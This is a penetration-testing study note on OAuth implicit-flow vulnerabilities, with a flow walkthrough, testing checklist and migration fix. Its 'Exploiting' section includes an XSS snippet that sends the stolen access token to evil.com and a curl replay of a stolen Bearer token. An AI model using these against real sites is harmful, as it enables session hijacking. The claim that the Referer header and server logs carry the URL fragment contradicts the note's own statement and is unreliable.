---
tags: [vapt, oauth, intermediate]
difficulty: intermediate
module: "19 - OAuth"
topic: "19.03 Implicit Flow (deprecated) — Vulnerabilities"
portswigger_labs: ["Authentication bypass via OAuth implicit flow"]
---

# 19.03 — Implicit Flow Vulnerabilities

## How Implicit Flow Works

```
IMPLICIT FLOW:
  Designed for SPAs before PKCE existed
  
  Key difference from Auth Code Flow:
  Auth Server returns ACCESS TOKEN directly (no code first!)
  
STEP 1: Client redirects:
  https://auth.example.com/oauth/authorize?
    client_id=CLIENT_ID&
    redirect_uri=https://app.example.com/callback&
    response_type=token&   ← "token" not "code"!
    scope=email&
    state=CSRF_TOKEN

STEP 2: User authenticates at auth server

STEP 3: Auth server redirects back:
  https://app.example.com/callback#access_token=TOKEN&token_type=Bearer&expires_in=3600
  
  ↑ NOTE: Token in URL fragment (#)!
  Fragment: not sent to server (stays in browser)
  But: visible in browser, JavaScript can read it!

STEP 4: JavaScript reads fragment:
  const token = new URLSearchParams(window.location.hash.substring(1)).get('access_token');
  
STEP 5: JavaScript uses token for API calls
```

---

## Why Implicit Flow Is Dangerous

```
PROBLEM 1: TOKEN IN URL FRAGMENT
  # = fragment → not sent to server in HTTP request
  BUT the full URL (including fragment) is visible in:
  - Browser history → address bar shows the token!
  - Browser logs
  - Bookmarks (if user bookmarks the callback URL)
  - JavaScript (any script on the page can read location.hash)
  
  → XSS on the callback page → token stolen!
  → Even without XSS: anyone who sees browser history gets the token

PROBLEM 2: NO CLIENT SECRET
  Implicit flow doesn't use client_secret
  → Any app can impersonate the client by knowing client_id
  → client_id is visible in the redirect URL
  
  Attacker creates malicious app with same client_id
  → Users redirected to malicious site → phishing!

PROBLEM 3: ACCESS TOKEN IN URL
  Access token in URL → all URL-related logging catches it:
  - Web server logs
  - Proxy logs
  - Analytics scripts see Referer header with token!

STATUS: DEPRECATED in OAuth 2.1
  Should NOT be used for new applications
  Should be migrated to Auth Code + PKCE
```

---

## Exploiting Implicit Flow

```
SCENARIO: App uses Implicit flow (response_type=token in URL)

ATTACK 1: Steal from Browser History
  In shared computer environment:
  Browser → History → search for the app URL
  Find: https://app.example.com/callback#access_token=STOLEN
  Use token: curl https://api.example.com/userinfo -H "Authorization: Bearer STOLEN"

ATTACK 2: Open Redirect + Token Theft
  If app has open redirect at callback page:
  Craft URL:
  https://auth.example.com/oauth/authorize?
    client_id=CLIENT_ID&
    redirect_uri=https://app.example.com/callback?next=https://evil.com&
    response_type=token
    
  After auth → callback gets token → redirect to evil.com
  EVIL.COM's JavaScript reads Referer: full URL including #access_token!
  → Token leaked!

ATTACK 3: XSS + Fragment Read
  XSS on callback page:
  <script>
  const token = location.hash.split('access_token=')[1].split('&')[0];
  fetch('https://evil.com/?t=' + token);
  </script>
```

---

## Testing for Implicit Flow

```bash
# CHECK response_type:
# Find the authorization redirect URL
# Look for: response_type=token (implicit) vs response_type=code (auth code)

# ALSO CHECK HYBRID:
# response_type=code+token (hybrid, also deprecated)
# response_type=token+id_token

# LOOK IN CALLBACK URL:
# If URL has #access_token= → implicit flow in use!
# If URL has ?code= → auth code flow (good!)

# BURP:
# HTTP History → search for "#access_token" or "access_token" in URL fragments
# HTML responses → search for "response_type=token"

# REPORT:
# "Application uses deprecated OAuth Implicit flow"
# "Access tokens transmitted in URL fragments, risking exposure via logs and history"
```

---

## Fix

```
MIGRATION PATH:
  Implicit Flow → Authorization Code + PKCE
  
  CHANGE:
  response_type=token → response_type=code
  
  ADD PKCE:
  code_challenge=BASE64URL(SHA256(code_verifier))
  code_challenge_method=S256
  
  (See note 19.05 for PKCE details)
  
  DISABLE IMPLICIT FLOW in Authorization Server:
  Okta: Application → Advanced → Grant Types → uncheck "Implicit"
  Auth0: Application → Settings → Advanced → Grant Types → uncheck "Implicit"
  
  IF MUST SUPPORT OLD CLIENTS:
  Use SPA-safe token delivery:
  Keep token in memory (not localStorage)
  Short expiry
  Don't put token in URL
```

---

## Related Notes
- [[05 - PKCE What It Protects Against]] — the modern fix
- [[10 - Token Leakage via Referer Header]] — token URL leakage
- [[11 - Token Leakage via Browser History]] — history-based leakage
- [[20 - Defense Strict Redirect URI PKCE State Validation]] — full fix
